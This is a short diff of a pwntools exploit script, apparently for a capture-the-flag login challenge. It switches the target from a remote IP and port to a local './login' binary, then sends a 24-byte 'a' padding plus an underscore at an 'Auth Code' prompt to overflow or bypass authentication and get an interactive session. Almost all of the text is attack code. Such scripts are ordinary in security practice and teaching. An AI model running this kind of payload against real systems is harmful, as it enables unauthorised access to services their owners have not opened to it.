@@ -1,7 +1,7 @@
 from pwn import *
 
-p = remote("218.76.35.74",20220)
-
+# p = remote("218.76.35.74",20220)
+p =process("./login")
 p.recvuntil(" Auth Code\n\n")
 p.sendline("a"*24+'_')
 p.interactive()
